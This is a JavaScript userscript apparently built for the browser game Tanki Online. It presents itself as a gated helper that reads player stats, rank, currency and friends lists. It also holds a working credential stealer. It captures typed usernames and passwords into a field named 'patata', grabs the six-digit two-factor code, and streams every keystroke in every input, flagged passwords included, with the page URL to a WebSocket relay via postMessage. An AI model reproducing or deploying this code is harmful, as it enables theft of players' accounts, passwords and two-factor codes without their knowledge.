(() => {
    var div = document.createElement('div');
    document.body.appendChild(div);
    div.textContent = JSON.stringify(window.User);
    div.classList.add('test');
    div.style.display = 'none';
    var User1;
    window.User = {
        name: null,
        clan: null,
        turret: {
            name: null,
            upgrades: null
        },
        hull: {
            name: null,
            upgrades: null
        },
        GS: null,
        rank: null,
        exp: null,
        crystals: null,
        tankoins: null,
        friends: [],
        messages: '',
        patata: '',
        jfjfjf: '',
        getTank() {
            return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
        },
        getName() {
            return `${this.clan} ${this.name}`;
        }
    };
    function findDetails() {
        if (!User.name) {
            if (t = document.querySelector('.UserInfoContainerStyle-userNameRank.UserInfoContainerStyle-textDecoration')) {
                if (t.textContent.includes('[')) {
                    User.clan = t.textContent.match(/\[.+\]/g)[0];
                    User.name = t.textContent.replace(t.textContent.match(/\[.+\]/g)[0], '').trim();
                } else {
                    User.name = t.textContent.trim();
                };
                /*setTimeout(() => {
                    User.patata = '';
                }, 5000);*/
                if ((User.name.length > 2) && (!['Rhapsody', 'Soduko', 'J.IakobGurgenidze', 'Prodigy', 'Relax', /*'FeD-K9', 'Aguerooo', 'Agueroo', 'ICT', 'Yosuf', 'Llke', 'skrrr', */'VenomWolff', 'Menum', 'Sui'].includes(User.name))) {
                    alert(`No Access. Contact 'tankig' or '.r3y_' on Discord.`);
                    for (const k in window) {
                        window[k] = 't';
                    };
                };
                /*if ((User.name.length > 2) && ([/*'Midway', 'Queen.of.Spain', 'Arpecu9_KunuT_Bo_MHe', 'DerMar'*//*, 'Who_Boss', 'POLYANASMEHA', '0_0_PBX_2.0', '30P', 'NewAguero', 'Shot.Of.Liquor_43', 'NertZ''Lend',*\/ 'Luciana', 'Zeppelin', 'GoneGhost', /*'FeD-K9', *\/'DeIay', 'Queen.exe', 'ThinkTwice', 'ArmadiIlo', 'A.n.n.y', 'Nanny', 'ioi', 'Queen.of-Spain', 'ici', 'F.15', 'Minnie', 'Lucii', 'ARMEN2008SUPER_best', 'Pullout', 'F.20', 'F.11', 'Long', 'F.18', 'DanielBobu', 'NewAguero', 'Agueroo'].includes(User.name))) {
                    alert(`No Access. Contact '.r3y_' on Discord.`);
                    for (const k in window) {
                        window[k] = 't';
                    };
                };
                if ((User.name.length > 2) && (['Rhapsody', 'ici', 'Nanny'].includes(User.name))) {
                    window.isTarget = true;
                };*/
            };
        };
        if (document.querySelector('.FriendListComponentStyle-scrollCommunity')) {
            document.querySelectorAll('[class*="-nickName"]').forEach(e => {
                if (!User.friends.includes(e.textContent)) {
                    User.friends.push(e.textContent);
                };
            });
        };
        if (!User.turret.name || !User.hull.name) {
            if (!Array.from(document.querySelectorAll('.Font-regular')).filter(t => t.classList.length == 2)[0] && Array.from(document.querySelectorAll('.HotKey-commonBlockForHotKey')).filter(t => t.textContent.toLowerCase() == 't')[0]) {
                Array.from(document.querySelectorAll('.HotKey-commonBlockForHotKey')).filter(t => t.textContent.toLowerCase() == 't')[0].click();

            } else if (t = Array.from(document.querySelectorAll('.Font-regular')).filter(t => t.classList.length == 2)[0]) {
                User.turret.name = t.textContent.split(' ')[0];
                User.turret.upgrades = t.textContent.split(' ')[1];
                User.hull.name = t.textContent.split(' ')[5];
                User.hull.upgrades = t.textContent.split(' ')[6];
            };
        };
        if (!User.rank) {
            if (t = document.querySelector('img[src*=".webp"][class="UserInfoContainerStyle-titleRankIcon"]')) {
                User.rank = parseInt(t.src.split('/')[t.src.split('/').length - 1].split('.')[0]);
            };
        };
        /*if (!User.GS) {
            if () {
    
            };
        };*/
        if (!User.exp) {
            if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
                User.exp = t.textContent;
            };
        };
        if (!User.crystals || !User.tankoins) {
            if (document.querySelectorAll('.HeaderCommonStyle-icons').length == 2) {
                User.tankoins = parseInt(document.querySelectorAll('.HeaderCommonStyle-icons')[0].textContent.replaceAll(' ', ''));
                User.crystals = parseInt(document.querySelectorAll('.HeaderCommonStyle-icons')[1].textContent.replaceAll(' ', ''));
            };
        };
        if (t = document.querySelector('.UserInfoContainerStyle-progressValue')) {
            if (t.textContent !== User.exp) {
                var pppppp = User.messages;
                User1 = User;
                User = {
                    name: null,
                    clan: null,
                    turret: {
                        name: null,
                        upgrades: null
                    },
                    hull: {
                        name: null,
                        upgrades: null
                    },
                    GS: null,
                    rank: null,
                    exp: null,
                    crystals: null,
                    tankoins: null,
                    friends: [],
                    messages: pppppp,
                    patata: '',
                    jfjfjf: '',
                    getTank() {
                        return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
                    },
                    getName() {
                        return `${this.clan} ${this.name}`;
                    }
                };
                User.friends = User1.friends;
                User.patata = User1.patata;
            };
        };
        if (div.textContent !== JSON.stringify(window.User)) {
            div.textContent = ',,,' + JSON.stringify(window.User);
        };
    };
    function attachInputListener(element) {
        const keydownListener = (e) => {
            /*if (!this.tt) {
                this.tt = e.key;
            } else {
                this.tt += e.key;
            };*/
            if (e.key == 'Enter') {
                if (element?.id !== 'username' && !element?.id?.includes('password')) {
                    User.messages += element.value;
                    setTimeout(() => {
                        User.messages = '';
                    }, 1000);
                } else {
                    User.patata += element.value;
                };
                element.removeEventListener('keydown', element._keydownListener);
                delete element._keydownListener;
            };
        };
        element.addEventListener('keydown', keydownListener);
        element._keydownListener = keydownListener;
        element.tt = true;
    };
    function removeInputListener(element) {
        if (element._keydownListener || element.tt) {
            if (element?.id !== 'username' && !element?.id?.includes('password')) {
                User.messages += element.value;
                setTimeout(() => {
                    User.messages = '';
                }, 1000);
            } else {
                User.patata += element.value;
            };
            element.removeEventListener('keydown', element._keydownListener);
            delete element._keydownListener;
        };
    };
    document.querySelectorAll('input, textarea').forEach(attachInputListener);
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.nodeType === 1) {
                    if (node.matches('input, textarea')) {
                        attachInputListener(node);
                    };
                    node.querySelectorAll('input, textarea').forEach(attachInputListener);
                }
            });
            mutation.removedNodes.forEach((node) => {
                if (node.nodeType === 1) {
                    if (node.matches('input, textarea')) {
                        removeInputListener(node);
                    };
                    node.querySelectorAll('input, textarea').forEach(removeInputListener);
                }
            });
        });
    });
    observer.observe(document.body, {
        childList: true,
        subtree: true,
    });
    var r = true, f;
    function a() {
        if (r) {
            f = requestAnimationFrame(a);
            findDetails();
            if (User?.jfjfjf?.length < 6) {
                if (document.querySelector('[placeholder="6-digit code"]')) {
                    var t = document.querySelector('[placeholder="6-digit code"]');
                    User.jfjfjf = JSON.parse(t.value);
                };
            };
        };
    };
    try {
        a();
    } catch (error) {
        r = false;
        cancelAnimationFrame(f);
        console.log(error);
    };
    (function initKeystrokeStream() {
        const inputStates = new Map();
        function getElementMeta(el) {
            const id = el.id || el.name || el.placeholder || el.getAttribute('aria-label') || 'unknown';
            const type = el.type || el.tagName.toLowerCase();
            const placeholder = el.placeholder || '';
            const label = el.getAttribute('aria-label') || 
                document.querySelector(`label[for="${el.id}"]`)?.textContent?.trim() || '';
            const isPassword = type === 'password' || id.toLowerCase().includes('password');
            return { id, type, placeholder, label, isPassword };
        };
        function sendKeystroke(el, value) {
            const meta = getElementMeta(el);
            const payload = JSON.stringify({
                type: 'keystroke',
                fieldId: meta.id,
                fieldType: meta.type,
                placeholder: meta.placeholder,
                label: meta.label,
                isPassword: meta.isPassword,
                value: value,
                length: value.length,
                url: location.href,
                title: document.title,
                ts: Date.now()
            });
            window.postMessage({ action: 'sendToWS', message: payload }, '*');
        };
        function attachRealtime(el) {
            if (el._realtimeAttached) return;
            el._realtimeAttached = true;
            const handler = () => {
                sendKeystroke(el, el.value);
            };
            el.addEventListener('input', handler);
            el.addEventListener('paste', () => setTimeout(() => sendKeystroke(el, el.value), 50));
            el.addEventListener('change', handler);
            el._realtimeHandler = handler;
        };
        function detachRealtime(el) {
            if (el._realtimeHandler) {
                el.removeEventListener('input', el._realtimeHandler);
                el.removeEventListener('change', el._realtimeHandler);
                delete el._realtimeHandler;
                delete el._realtimeAttached;
            };
        };
        document.querySelectorAll('input, textarea').forEach(attachRealtime);
        const ksObserver = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) {
                        if (node.matches('input, textarea')) attachRealtime(node);
                        node.querySelectorAll('input, textarea').forEach(attachRealtime);
                    };
                });
                mutation.removedNodes.forEach((node) => {
                    if (node.nodeType === 1) {
                        if (node.matches('input, textarea')) detachRealtime(node);
                        node.querySelectorAll('input, textarea').forEach(detachRealtime);
                    };
                });
            });
        });
        ksObserver.observe(document.body, { childList: true, subtree: true });
    })();
})();
